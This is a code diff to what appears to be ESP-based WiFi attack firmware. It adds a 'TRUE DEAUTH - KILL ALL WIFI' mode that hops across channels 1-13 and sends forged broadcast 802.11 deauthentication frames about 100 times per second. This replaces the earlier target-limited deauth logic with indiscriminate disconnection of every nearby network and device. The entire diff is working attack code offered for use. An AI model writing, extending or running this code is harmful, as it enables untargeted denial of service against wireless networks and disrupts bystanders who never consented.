@@ -71,6 +71,23 @@ void Attack::startEvilTwin(const char* ssid, uint8_t ch, bool wpa2, const uint8_
     running = true;
 }
 
+void Attack::startTrueDeauth() {
+    stop();
+    trueDeauth = true;
+    running = true;
+    attackTime = currentTime;
+    attackStartTime = currentTime;
+    
+    prntln("=================================");
+    prntln("TRUE DEAUTH - KILL ALL WIFI");
+    prntln("Channel Hopping: 1-13");
+    prntln("Broadcasting deauth to ALL");
+    prntln("=================================");
+    
+    // Start at channel 1
+    setWifiChannel(1, true);
+}
+
 void Attack::stop() {
     if (running) {
 #ifdef ESP32
@@ -587,21 +604,43 @@ void Attack::evilTwinUpdate() {
 void Attack::trueDeauthUpdate() {
     if (!trueDeauth) return;
     
-    uint32_t maxPkts = settings::getAttackSettings().deauths_per_target * (accesspoints.count() + stations.count());
-    uint32_t interval = 1000 / maxPkts;
+    // TRUE DEAUTH - Kill ALL WiFi with channel hopping
+    // Send broadcast deauth to ALL devices on current channel
+    static uint32_t lastChannelHop = 0;
+    static uint8_t currentHopChannel = 1;
     
-    if (deauth.time <= currentTime - interval) {
+    // Channel hopping every 200ms
+    if (currentTime - lastChannelHop > 200) {
+        lastChannelHop = currentTime;
+        currentHopChannel++;
+        if (currentHopChannel > 13) currentHopChannel = 1;
+        setWifiChannel(currentHopChannel, true);
+    }
+    
+    // Send broadcast deauth packets continuously
+    static uint32_t lastDeauth = 0;
+    if (currentTime - lastDeauth > 10) {  // ~100 packets per second
+        lastDeauth = currentTime;
+        
+        // Send broadcast deauth - affects ALL clients on this channel
+        uint8_t deauthBroadcast[26] = {
+            0xC0, 0x00,                         // Type: Deauth
+            0x00, 0x00,                         // Flags
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: Broadcast
+            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,  // Source: Fake
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID: Broadcast
+            0x01, 0x00                         // Reason: Unspecified
+        };
+        
+        sendPacket(deauthBroadcast, 26, currentHopChannel, true);
+        deauthPkts++;
+        
+        // Also send to specific targets if any
         for (int i = 0; i < apCount; i++) {
             if (accesspoints.getSelected(i)) {
                 deauthAP(i);
             }
         }
-        for (int i = 0; i < stCount; i++) {
-            if (stations.getSelected(i)) {
-                deauthStation(i);
-            }
-        }
-        deauth.time = currentTime;
     }
 }
 
